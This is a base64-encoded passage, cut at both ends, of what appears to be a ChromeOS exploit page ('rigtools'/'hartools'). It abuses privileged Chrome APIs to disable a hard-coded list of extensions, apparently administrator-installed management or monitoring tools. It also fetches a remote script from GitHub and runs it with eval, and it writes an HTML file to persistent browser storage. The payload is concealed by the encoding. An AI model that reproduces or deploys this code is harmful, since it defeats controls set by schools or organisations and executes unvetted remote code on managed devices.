zlkYmFlOTsKICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgYm9yZGVyOiAxcHggc29saWQgIzA0N2RiNzsKICAgIGJvcmRlci1yYWRpdXM6IDIwcHg7CiAgICBoZWlnaHQ6IDM1cHg7CiAgICBwYWRkaW5nOiA3cHggMTBweDsKICAgIGN1cnNvcjogcG9pbnRlcjsKICAgIGFsaWduLXNlbGY6IGZsZXgtZW5kOwogICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZCAwLjJzIGVhc2UtaW4tb3V0OwogICAgb3V0bGluZTogbm9uZTsKfQoKYnV0dG9uOmhvdmVyIHsKICAgIGJhY2tncm91bmQ6ICMzODM5M2I7Cn0KCmlucHV0IHsKICBwYWRkaW5nOiA4cHggMTZweDsKICBtYXJnaW46IDRweCAycHg7CiAgY29sb3I6IHdoaXRlOwogIGJhY2tncm91bmQtY29sb3I6ICMwYTBhMGE7CiAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKfQoKaW5wdXQ6aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICMxMTE7CiAgYm9yZGVyLWNvbG9yOiAjZmZmOwp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvbiB7CiAgcG9zaXRpb246IHJlbGF0aXZlOwogIGRpc3BsYXk6IGlubGluZS1mbGV4OwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAganVzdGlmeS1jb250ZW50OiBmbGV4LXN0YXJ0OwogIHBhZGRpbmc6IDlweCAxNXB4IDlweCA2MHB4OwogIGJhY2tncm91bmQtY29sb3I6IHdoaXRlOwogIGNvbG9yOiBibGFjazsKICBib3JkZXItcmFkaXVzOiA2cHg7CiAgbWFyZ2luOiA0cHggMnB4OwogIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4zcywgY29sb3IgMC4zczsKfQoKI3RvZ2dsZWFibGUtYnV0dG9ucyBidXR0b246aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7Cn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uOjpiZWZvcmUgewogIGNvbnRlbnQ6ICcnOwogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBsZWZ0OiAxMnB4OwogIHRvcDogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsKICB3aWR0aDogNDJweDsKICBoZWlnaHQ6IDIycHg7CiAgYmFja2dyb3VuZC1jb2xvcjogIzMzMzsKICBib3JkZXItcmFkaXVzOiAxMnB4Owp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvbjo6YWZ0ZXIgewogIGNvbnRlbnQ6ICcnOwogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBsZWZ0OiAxNHB4OwogIHRvcDogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsKICB3aWR0aDogMThweDsKICBoZWlnaHQ6IDE4cHg7CiAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsKICBib3JkZXItcmFkaXVzOiA1MCU7Cn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uW3RvZ2dsZWQ9InRydWUiXTo6YmVmb3JlIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvblt0b2dnbGVkPSJ0cnVlIl06OmFmdGVyIHsKICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTUwJSkgdHJhbnNsYXRlWCgyMHB4KTsKfQoKLmNvbnRhaW5lciB7CiAgZGlzcGxheTogZmxleDsKICBnYXA6IDEwcHg7Cn0KCiNjb2RlLXJ1biB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsKICBjb2xvcjogYmxhY2s7CiAgYm9yZGVyOiBub25lOwogIGJvcmRlci1yYWRpdXM6IDVweDsKICBwYWRkaW5nOiA4cHggMTZweDsKICBmb250LXdlaWdodDogYm9sZDsKICBjdXJzb3I6IHBvaW50ZXI7Cn0KCiNjb2RlLXJ1bjpob3ZlciB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2UyZTJlMjsKfQoKI2NvZGUgewogIGJhY2tncm91bmQ6ICMwMDA7CiAgY29sb3I6IHdoaXRlOwogIHdpZHRoOiAxMDAlOwogIG1pbi1oZWlnaHQ6IDUwcHg7CiAgaGVpZ2h0OiAyMDBweDsKICByZXNpemU6IGJvdGg7CiAgYm9yZGVyOiAxcHggc29saWQgIzRCNEI0RDsKICBib3JkZXItcmFkaXVzOiA1cHg7CiAgZm9udC1mYW1pbHk6IG1vbm9zcGFjZSwgc2Fucy1zZXJpZjsKICBwYWRkaW5nOiA4cHg7CiAgYm94LXNpemluZzogYm9yZGVyLWJveDsKfQoKI2NvZGU6Zm9jdXMgewogIGJvcmRlci1jb2xvcjogI2ZmZjsKfQoKLnRvYXN0W3BvcG92ZXJdOnBvcG92ZXItb3BlbiB7CiAgb3BhY2l0eTogMTsKICB0b3A6IDVweDsKICBsZWZ0OiA1MCU7Cn0KCkBzdGFydGluZy1zdHlsZSB7CiAgLnRvYXN0W3BvcG92ZXJdOnBvcG92ZXItb3BlbiB7CiAgICBvcGFjaXR5OiAwOwogICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0xMDAlKTsKICB9Cn0KCi50b2FzdFtwb3BvdmVyXSB7CiAgcG9zaXRpb246IGZpeGVkOwogIGluc2V0OiB1bnNldDsKICBwYWRkaW5nOiA1cHggMTBweDsKICBib3JkZXItcmFkaXVzOiA1cHg7CiAgb3BhY2l0eTogMDsKICBmb250LXdlaWdodDogYm9sZDsKICBiYWNrZ3JvdW5kOiAjMGEwYTBhOwogIGNvbG9yOiB3aGl0ZTsKICBib3JkZXI6IDFweCBzb2xpZCAjNDQ0Owp9CgpkaWFsb2cgewogIG9wYWNpdHk6IDA7CiAgcGFkZGluZzogMzBweDsKICBib3JkZXI6IDFweCBzb2xpZCAjMmQyZDJkOwogIGJhY2tncm91bmQ6ICMwMDA7CiAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KCMzMzMgMXB4LCB0cmFuc3BhcmVudCAxcHgpOwogIGJhY2tncm91bmQtc2l6ZTogMnJlbSAycmVtOwogIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgdHJhbnNpdGlvbjogYWxsIDAuNXM7CiAgbWluLXdpZHRoOiA1MHZ3OwogIG1pbi1oZWlnaHQ6IDYwdmg7CiAgbWF4LXdpZHRoOiA1MHZ3OwogIG1heC1oZWlnaHQ6IDYwdmg7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwp9CgpkaWFsb2dbb3Blbl0gewogIG9wYWNpdHk6IDE7CiAgdHJhbnNmb3JtOiBzY2FsZSgxKTsKfQoKZGlhbG9nOjpiYWNrZHJvcCB7CiAgYmFja2dyb3VuZDogcmdiYSgwLCAwLCAwLCAwLjI1KTsKICBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoM3B4KTsKfQoKZGlhbG9nIGRpdiB7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsKICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKfQoKZGlhbG9nIHAgewogIG1hcmdpbi1ib3R0b206IDlweDsKICBwYWRkaW5nOiA5cHg7CiAgYm9yZGVyOiAxcHggc29saWQgIzI3MjcyYTsKICBmb250LXdlaWdodDogNzAwOwp9CgpkaWFsb2cgaDEgewogIGZvbnQtc2l6ZTogMS41cmVtOwogIGNvbG9yOiB3aGl0ZTsKICBmb250LXdlaWdodDogOTAwOwp9Cgp3aGl0ZWJ1dHRvbnMgYnV0dG9uIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsKICBib3JkZXI6IDFweCBzb2xpZCByZ2IoNCwgMTI1LCAxODMpOwogIGNvbG9yOiByZ2IoMTY4LCAxOTksIDI1MCk7Cn0KCndoaXRlYnV0dG9ucyBidXR0b246aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMTY4LCAxOTksIDI1MCwgMC4xKTsKfQoKbGl0c3R1ZmYgewogIGNvbG9yOiAjNDQ0OwogIGZvbnQtZmFtaWx5OiBtb25vc3BhY2UsIHNhbnMtc2VyaWY7CiAgZm9udC1zaXplOiAxMnB4OwogIGZvbnQtc3R5bGU6IGl0YWxpYzsKICBtYXJnaW4tbGVmdDogNnB4Owp9CiAgICA8L3N0eWxlPgogIGA7CgpvbmxvYWQgPSBhc3luYyBmdW5jdGlvbiB4KCkgewogICAgbGV0IGZvdW5kTm90aGluZyA9IHRydWU7CiAgICBkb2N1bWVudC5vcGVuKCk7CiAgICB0aGlzLmRvY3VtZW50LndyaXRlKGh0bWxTdHlsZSk7CiAgICBkb2N1bWVudC5jbG9zZSgpOwoKICAgIGlmIChjaHJvbWUuZmlsZU1hbmFnZXJQcml2YXRlKSB7CiAgICAgICAgY2hyb21lLmZpbGVNYW5hZ2VyUHJpdmF0ZS5vcGVuVVJMKCJkYXRhOnRleHQvaHRtbCw8aDE+SGVsbG88L2gxPiIpOwogICAgICAgIGRvY3VtZW50LndyaXRlKGZpbGVNYW5hZ2VyUHJpdmF0ZVRlbXBsYXRlKTsKICAgICAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNidG5fRk1QX29wZW5VUkwiKS5vbmNsaWNrID0gZnVuY3Rpb24oZXYpIHt9OwogICAgfQoKICAgIGlmIChjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKSB7CiAgICAgICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoImJlZm9yZWVuZCIsIG1hbmFnZW1lbnRUZW1wbGF0ZSk7Cgljb25zdCBleHRlbnNpb25pbmZvID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2V4dGVuc2lvbi1pbmZvJyk7CglpZiAoZXh0ZW5zaW9uaW5mbykgewogIAkgICAgY29uc3QgZXh0ZW5zaW9uTmFtZSA9IGNocm9tZS5ydW50aW1lLmdldE1hbmlmZXN0KCkubmFtZTsKICAJICAgIGNvbnN0IGV4dGVuc2lvbklkID0gY2hyb21lLnJ1bnRpbWUuaWQ7CiAgCSAgICBjb25zdCBjaHJvbWVWZXJzaW9uID0gbmF2aWdhdG9yLmFwcFZlcnNpb24ubWF0Y2goL0Nocm9tKGV8aXVtKVwvKFswLTldKykvKVsyXTsKICAJICAgIGV4dGVuc2lvbmluZm8uaW5uZXJIVE1MID0gYDxwPkN1cnJlbnQgRXh0ZW5zaW9uOiAke2V4dGVuc2lvbk5hbWV9ICgke2V4dGVuc2lvbklkfSksIENocm9tZSBWZXJzaW9uOiBSJHtjaHJvbWVWZXJzaW9ufTwvcD48aHI+YDsKCX0KICAgICAgICBjb25zdCBleHRsaXN0X2VsZW1lbnQgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuZXh0bGlzdCIpOwoKICAgICAgICBhd2FpdCB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KTsKICAgICAgICBjb25zdCBjb250YWluZXJfZXh0ZW5zaW9ucyA9IGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigKICAgICAgICAgICAgIiNjaHJvbWVfbWFuYWdlbWVudF9kaXNhYmxlX2V4dCIKICAgICAgICApOwoKICAgICAgICBjb250YWluZXJfZXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjY3VycmVudC1leHRlbnNpb24iKS5vbmNsaWNrID0KICAgICAgICAgICAgYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBncmFiaWR0b2tpbGwgPSBjaHJvbWUucnVudGltZS5pZDsKICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKGdyYWJpZHRva2lsbCwgZmFsc2UpOwogICAgICAgICAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgYWxlcnQoInVuc3VjY2Vzc2Z1bCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9OwoKICAgICAgICBjb250YWluZXJfZXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjcm12LWNtbi1ibHQiKS5vbmNsaWNrID0gZnVuY3Rpb24gZGYoKSB7CiAgICAgICAgICAgIGNvbnN0IGJsb2F0SWRzID0gWwogICAgICAgICAgICAgICAgImNnYmJiam1nZHBuaWZpamNvbmhhbWdnamVobGFtY2lmIiwKICAgICAgICAgICAgICAgICJsZmtiYm1jbG5wYWlocGFhamhvaGhmZGplbGNoa2lrZiIsCiAgICAgICAgICAgICAgICAibmNib2ZuaG1tZmZmbWNkbWJqZmFpZ2Vwa2dtam5sbmUiLAogICAgICAgICAgICAgICAgInBvaG1nb2JkZWFqZW1jaWZwb2xkbm5oZmZqbm5raGdmIiwKICAgICAgICAgICAgICAgICJiZWNkcGxmYWxvb2ZsYW5pcGpvYmxjbXBhZWtrYmJoZSIsCiAgICAgICAgICAgICAgICAiZmVlcG1kbG1ocGxhb2phYmVvZWNhb2JmbWlib29haWQiLAogICAgICAgICAgICAgICAgImFka2Nwa3BnaGFobWJvcGtqY2hvYmllY2tlb2FvZWVtIiwKICAgICAgICAgICAgICAgICJoYWxkbGdsZHBsZ25nZ2tqYWFmaGVsZ2lhZ2xhZmFuaCIsCiAgICAgICAgICAgICAgICAiZmlsZ3Bqa2RtamlubWpiZXBicG1uZm9ibWptZ2ltb24iLAogICAgICAgICAgICAgICAgImtrYm1kZ2pnZ2NkYWpja2RsYm5nZGpvbnBjaHBhaWVhIiwKICAgICAgICAgICAgICAgICJuamRuaWNsZ2VnaWpkY2RsaWtsZ2llaWNhbnBtY25naiIsCiAgICAgICAgICAgICAgICAiaHBrZG9rYWtqZ2xwcGVla2ZlZWttZWJmYWhhZG5mbHAiLAogICAgICAgICAgICBdOwoKICAgICAgICAgICAgbGV0IGV4dHMgPSB7fTsKICAgICAgICAgICAgbGV0IGV4dGxuZ3RoID0gMDsKCiAgICAgICAgICAgIGZ1bmN0aW9uIGdldExlbmd0aCgpIHsKICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gewogICAgICAgICAgICAgICAgICAgIGJsb2F0SWRzLmZvckVhY2goKGlkLCBpKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbkV4aXN0cyhpZCkudGhlbigocmVzKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAocmVzKSBleHRsbmd0aCsrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGJsb2F0SWRzLmxlbmd0aCAtIDEgPT09IGkpIHJlc29sdmUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gaW5pdEV4dE9iaigpIHsKICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gewogICAgICAgICAgICAgICAgICAgIGJsb2F0SWRzLmZvckVhY2goKGlkKSA9PgogICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXQoaWQsIChlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3QuYXNzaWduKGV4dHMsIEpTT04ucGFyc2UoYHsiJHtlLmlkfSI6IiR7ZS5zaG9ydE5hbWV9In1gKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoT2JqZWN0LmtleXMoZXh0cykubGVuZ3RoID09IGV4dGxuZ3RoKSByZXNvbHZlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CgogICAgICAgICAgICBnZXRMZW5ndGgoKS50aGVuKCgpID0+CiAgICAgICAgICAgICAgICBpbml0RXh0T2JqKCkudGhlbigoKSA9PgogICAgICAgICAgICAgICAgICAgIG1ha2VEaWFsb2coCiAgICAgICAgICAgICAgICAgICAgICAgICJBcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGlzYWJsZSB0aGUgZm9sbG93aW5nIGV4dGVuc2lvbnM/IiwKICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LnZhbHVlcyhleHRzKSwKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7fSwKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlzYWJsZWRFeHRzID0gW107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3Qua2V5cyhleHRzKS5mb3JFYWNoKChpZCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldChpZCwgKGUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGUuZW5hYmxlZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlkID09IGNocm9tZS5ydW50aW1lLmlkKSByZXR1cm47CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLnB1c2goZS5zaG9ydE5hbWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChpZCwgZmFsc2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWRpc2FibGVkRXh0cy5sZW5ndGggPCAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1ha2VUb2FzdCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJkaXNhYmxlZCB0aGUgZm9sbG93aW5nIGV4dGVuc2lvbnM6XHJcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLmpvaW4oIlxyXG4iKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlRXh0ZW5zaW9uU3RhdHVzKGV4dGxpc3RfZWxlbWVudCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMjUwKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgKTsKICAgICAgICB9OwoKICAgICAgICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSA9PSBKU09OLnN0cmluZ2lmeShbXSkpIHsKICAgICAgICAgICAgY29udGFpbmVyX2V4dGVuc2lvbnMKICAgICAgICAgICAgICAgIC5xdWVyeVNlbGVjdG9yKCIjZGlzYWJsZS11c2VyZGVmLWV4dHMiKQogICAgICAgICAgICAgICAgLnNldEF0dHJpYnV0ZSgic3R5bGUiLCAiZGlzcGxheTogbm9uZTsiKTsKICAgICAgICB9CgogICAgICAgIGNvbnRhaW5lcl9leHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiNkaXNhYmxlLXVzZXJkZWYtZXh0cyIpLm9uY2xpY2sgPQogICAgICAgICAgICBmdW5jdGlvbiBkZihlKSB7CiAgICAgICAgICAgICAgICBsZXQgZXh0cyA9IHt9OwoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGluaXRFeHRPYmooKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IGlkbGlzdCA9IEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlkbGlzdC5mb3JFYWNoKChpZCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0KGlkLCAoZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC5hc3NpZ24oZXh0cywgSlNPTi5wYXJzZShgeyIke2UuaWR9IjoiJHtlLnNob3J0TmFtZX0ifWApKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoT2JqZWN0LmtleXMoZXh0cykubGVuZ3RoID09IGlkbGlzdC5sZW5ndGgpIHJlc29sdmUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpbml0RXh0T2JqKCkudGhlbigoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgbWFrZURpYWxvZygKICAgICAgICAgICAgICAgICAgICAgICAgIkFyZSB5b3Ugc3VyZSB5b3Ugd2FudCB0byBkaXNhYmxlIHRoZSBmb2xsb3dpbmcgZXh0ZW5zaW9ucz8iLAogICAgICAgICAgICAgICAgICAgICAgICBPYmplY3QudmFsdWVzKGV4dHMpLAogICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpIHt9LAogICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBkaXNhYmxlZEV4dHMgPSBbXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSkuZm9yRWFjaCgoaWQpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXQoaWQsIChlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlLmVuYWJsZWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpZCA9PSBjaHJvbWUucnVudGltZS5pZCkgcmV0dXJuOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5wdXNoKGUuc2hvcnROYW1lKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoaWQsIGZhbHNlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFkaXNhYmxlZEV4dHMubGVuZ3RoIDwgMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYWtlVG9hc3QoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGlzYWJsZWQgdGhlIGZvbGxvd2luZyBleHRlbnNpb25zOlxyXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5qb2luKCJcclxuIiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMubGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDI1MCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH07CiAgICB9CiAgICBjb25zdCBvdGhlckZlYXR1cmVzID0gd2luZG93LmNocm9tZS5ydW50aW1lLmdldE1hbmlmZXN0KCk7CiAgICBjb25zdCBwZXJtaXNzaW9ucyA9IG90aGVyRmVhdHVyZXMucGVybWlzc2lvbnM7CgogICAgbmV3IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMoKS5hY3RpdmF0ZSgpOwogICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoCiAgICAgICAgImJlZm9yZWVuZCIsCiAgICAgICAgYAogICAgICA8dGl0bGU+VW50aXRsZWQgZG9jdW1lbnQ8L3RpdGxlPgogICAgICA8bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluLyI+CiAgICAgIGAKICAgICk7CgogICAgY29uc3QgU2NyaXB0QnV0dG9ucyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNvdGhlci1idXR0b25zIik7CgogICAgU2NyaXB0QnV0dG9ucy5xdWVyeVNlbGVjdG9yKCIjc3dhbXAiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIGZldGNoKAogICAgICAgICAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UM00xTjRML3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL3NjcmlwdHMvc3dhbXAtdWx0cmEuanMiCiAgICAgICAgICAgICkKICAgICAgICAgICAgLnRoZW4oKHJlcykgPT4gcmVzLnRleHQoKSkKICAgICAgICAgICAgLnRoZW4oZXZhbCk7CiAgICB9OwoKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI3VwZGF0ZSIpLm9uY2xpY2sgPSBhc3luYyBmdW5jdGlvbiBkZihlKSB7CiAgICAgICAgKGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlKSB7CiAgICAgICAgICAgICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShQRVJTSVNURU5ULCAyICogMTAyNCAqIDEwMjQsIHJlc29sdmUpOwogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIGZ1bmN0aW9uIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGVudHJ5KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LnJlbW92ZShmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRlOiB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbih3cml0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLndyaXRlKG5ldyBCbG9iKFtkYXRhXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9IHJlc29sdmUuYmluZChudWxsLCBlbnRyeS50b1VSTCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CgogICAgICAgICAgICBjb25zdCB1cmwgPSBhd2FpdCB3cml0ZUZpbGUoCiAgICAgICAgICAgICAgICAiaGFydG9vbHMuaHRtbCIsCiAgICAgICAgICAgICAgICBgJHthd2F